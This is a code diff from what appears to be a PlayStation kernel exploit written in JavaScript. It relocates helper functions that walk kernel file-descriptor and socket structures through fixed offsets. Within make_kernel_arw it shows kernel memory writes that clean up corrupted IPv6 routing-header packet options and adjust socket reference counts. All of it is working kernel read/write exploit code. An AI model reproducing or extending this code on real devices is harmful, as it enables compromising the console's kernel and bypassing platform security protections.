@@ -1178,35 +1178,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const off_tclass = is_ps4 ? 0xb0 : 0xc0;
     
  
- /* var PROC_FD    =   0x48;
- var PROC_PID    =  0xb0;
- var PROC_VM_SPACE= 0x200;
- */
-
- //var FILEDESC_OFILES= 0x0;
-var  SIZEOF_OFILES = 0x8;
-
-
-
-
-  var SO_PCB        = 0x18;
-var  INPCB_PKTOPTS = 0x118;
  
-    
- 
- 
-function get_fd_data_addr(fd) {
-  const filep = kmem.read64(ofiles.add(fd * SIZEOF_OFILES));
-  return kmem.read64(filep.add(0));  
-}
 
-function get_sock_pktopts(fd) {
-  const so = get_fd_data_addr(fd);
-  const pcb = kmem.read64(so.add(SO_PCB));
-  return kmem.read64(pcb.add(INPCB_PKTOPTS));
-}
- 
- 
 
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
@@ -1508,6 +1481,27 @@ function get_sock_pktopts(fd) {
 
 
 
+
+    var  SIZEOF_OFILES = 0x8;
+   var SO_PCB        = 0x18;
+  var  INPCB_PKTOPTS = 0x118;
+ 
+
+ 
+ 
+function get_fd_data_addr(fd) {
+ 
+  const o_files = new Addr(ofiles.lo, ofiles.hi);
+  const filep = kmem.read64(o_files.add(fd * SIZEOF_OFILES));
+  return kmem.read64(filep.add(0));
+}
+
+function get_sock_pktopts(fd) {
+  const so = get_fd_data_addr(fd);
+  const pcb = kmem.read64(so.add(SO_PCB));
+  return kmem.read64(pcb.add(INPCB_PKTOPTS));
+}
+ 
  try{
 for (let i = 0; i < sds.length; i++) {
   const pkto = get_sock_pktopts(sds[i]);
@@ -1517,7 +1511,7 @@ for (let i = 0; i < sds.length; i++) {
 kmem.write64(get_sock_pktopts(reclaim_sock).add(off_ip6po_rthdr), 0);
 kmem.write64(worker_pktopts.add(off_ip6po_rthdr), 0);
 
-    const sock_increase_ref = [
+const sock_increase_ref = [
   ipv6_kernel_rw.data.master_sock,
   ipv6_kernel_rw.data.victim_sock,
   main_sock,
